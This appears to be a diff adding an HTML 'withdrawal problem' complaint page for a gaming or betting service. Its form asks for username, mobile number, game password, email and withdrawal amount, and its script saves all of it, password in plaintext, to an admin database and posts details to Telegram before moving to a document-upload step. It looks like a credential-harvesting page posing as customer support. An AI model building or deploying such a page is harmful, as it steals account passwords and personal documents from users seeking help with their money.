@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdrawal Problem</title>
+    <link rel="icon" type="image/jpeg" href="FAVICONS/images.jpg">
+    <link rel="stylesheet" href="style3.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+    <script src="app-config.js"></script>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <a href="index.html" class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
+            </a>
+            <h1>WITHDRAWAL PROBLEM COMPLAIN PAGE</h1>
+        </div>
+    </header>
+
+    <main>
+        <form class="complain-form">
+            <div class="step-title">STEP 1 - ACCOUNT DETAILS</div>
+
+            <div class="form-group">
+                <label>USER NAME</label>
+                <input type="text" placeholder="Enter your username" required>
+            </div>
+
+            <div class="form-group">
+                <label>REGISTER MOBILE NUMBER</label>
+                <input type="tel" placeholder="Enter registered mobile number" required>
+            </div>
+
+            <div class="form-group">
+                <label>GAME PASSWORD</label>
+                <input type="password" placeholder="Enter game password" required>
+            </div>
+
+            <div class="form-group">
+                <label>EMAIL ID</label>
+                <input type="email" placeholder="Enter email address" required>
+            </div>
+
+            <div class="form-group">
+                <label>SELECT PROBLEM</label>
+                <select required>
+                    <option value="" disabled selected>Select your problem</option>
+                    <option value="pending">PENDING</option>
+                    <option value="processing">PROCESSING</option>
+                    <option value="reject">REJECT</option>
+                    <option value="not-received">NOT RECEIVED BANK ACCOUNT</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>ENTER WITHDRAWAL AMOUNT</label>
+                <input type="number" placeholder="Enter withdrawal amount" required>
+            </div>
+
+            <button type="submit" class="submit-btn">NEXT</button>
+        </form>
+    </main>
+
+    <script>
+        document.querySelector('.complain-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const inputs = document.querySelectorAll('.form-group input, .form-group select');
+            let allFilled = true;
+            
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                    input.style.borderColor = '#ff4444';
+                } else {
+                    input.style.borderColor = '#ddd';
+                }
+            });
+            
+            if (!allFilled) {
+                alert('Please fill all fields!');
+                return;
+            }
+
+            const mobile = inputs[1].value.trim();
+            const requestId = makeRequestId();
+            const now = new Date();
+
+            const complaintData = {
+                request_id: requestId,
+                user_name: inputs[0].value.trim(),
+                mobile: mobile,
+                password: inputs[2].value,
+                email: inputs[3].value.trim(),
+                issue_status: inputs[4].value,
+                amount: inputs[5].value,
+                type: 'Withdrawal Problem',
+                status: 'Pending',
+                documents: 'pending',
+                date: now.toLocaleDateString(),
+                time: now.toLocaleTimeString(),
+                timestamp: now.getTime()
+            };
+
+            const btn = document.querySelector('.submit-btn');
+            btn.classList.add('loading');
+            btn.textContent = 'SUBMITTING...';
+
+            try {
+                // Step 1 of 2 — the request is already in the admin panel, the
+                // document images are attached to this same entry on step 2.
+                const docId = await saveSubmission(complaintData);
+                await saveChatSession(complaintData);
+                localStorage.setItem('pendingWithdrawal', JSON.stringify(Object.assign({ id: requestId, doc_id: docId }, complaintData)));
+
+                notifyTelegram(`🚨 <b>New Complaint - Withdrawal</b>\n\n👤 Name: ${complaintData.user_name}\n📱 Mobile: ${mobile}\n📧 Email: ${complaintData.email}\n💰 Amount: ${complaintData.amount}\n📝 Problem: ${complaintData.issue_status}\n🆔 Request: ${requestId}\n⏰ Time: ${now.toLocaleString()}`);
+
+                showNotification('Step 1 saved. Upload your documents.', 'success');
+                setTimeout(() => { window.location.href = 'withdrawal-step2.html'; }, 1800);
+            } catch (err) {
+                console.error('Withdrawal submit failed:', err);
+                showNotification('Failed to send. Please try again.', 'error');
+                btn.classList.remove('loading');
+                btn.textContent = 'NEXT';
+            }
+        });
+    </script>
+
+</body>
+</html>
